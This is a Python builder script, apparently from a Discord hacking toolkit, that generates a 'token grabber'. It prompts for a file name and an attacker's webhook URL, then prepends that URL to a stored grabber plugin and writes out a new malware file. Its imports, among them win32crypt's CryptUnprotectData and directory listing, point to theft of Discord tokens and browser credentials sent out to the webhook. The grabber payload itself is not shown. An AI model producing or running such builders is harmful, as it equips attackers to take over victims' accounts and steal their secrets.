from urllib.request import Request, urlopen
from subprocess import Popen, PIPE
import requests, json, os
from datetime import datetime
import disnake, os
from io import BytesIO
from disnake.ext import commands
import aiohttp
from disnake.utils import get
from disnake import WebhookMessage, WebhookType
import time
from colorama import Fore, Style, Back
import string
from disnake import Permissions
import subprocess
import webbrowser
import sys
import colorama
import asyncio
from os import system
import asyncio
import codecs
import sys
import io
import random
import asyncio
import codecs
import sys
import io
from pystyle import Colors, Write
import threading
import requests
import os
import colorama
from disnake.ext import commands
from disnake.ext.commands import Bot
from colorama import Fore, init
from selenium import webdriver
from datetime import datetime
from itertools import cycle
from fade import *
from base64 import b64decode
from win32crypt import CryptUnprotectData
from os import getlogin, listdir
from json import loads
from re import findall
from urllib.request import Request, urlopen
from subprocess import Popen, PIPE
import requests, json, os
from datetime import datetime
from dhooks import Webhook
import socket
from disnake.ext import commands
from disnake.utils import get
from colorama import Fore, init


name = Write.Input('''
[+]Input the name of the file:''', Colors.blue_to_purple, interval=0.000)
WEBHOOK_URL = Write.Input('[+]Insert Your Webhook URL:', Colors.blue_to_purple, interval=0.000)
try:
    this=open('utilities/Plugins/Token_Grabber_Plugin2.py').read()
    file = open(f"utilities/Token_Grabber/{name}.py", "a")
    file.write(f'WEBHOOK_URL = "{WEBHOOK_URL}"\n')
    file.write(this)
    file.close()
    time.sleep(1)
    Write.Print(f"""
Creating the file grabber...""", Colors.blue_to_purple, interval=0.000)
    time.sleep(2)
    Write.Print(f"""
{name}.py""", Colors.blue_to_purple, interval=0.000)
    time.sleep(1)
    Write.Print(f"""
[+]Sucessfully created the file grabber:{name}.py go on the folder:"Token_Grabber"\n to find the newly created file!""", Colors.red_to_purple, interval=0.000)
    time.sleep(2)
    Write.Input(f"""
[>>>]Press ENTER to exit:""", Colors.blue_to_cyan, interval=0.000)
    os.startfile('Component.py')
    os._exit(0)
except:
    Write.Input(f"""
[+]Sucessfully created the file grabber:{name}.py, Press ENTER to exit:""", Colors.red_to_purple, interval=0.000)
    os.startfile('Component.py')
    os._exit(0)
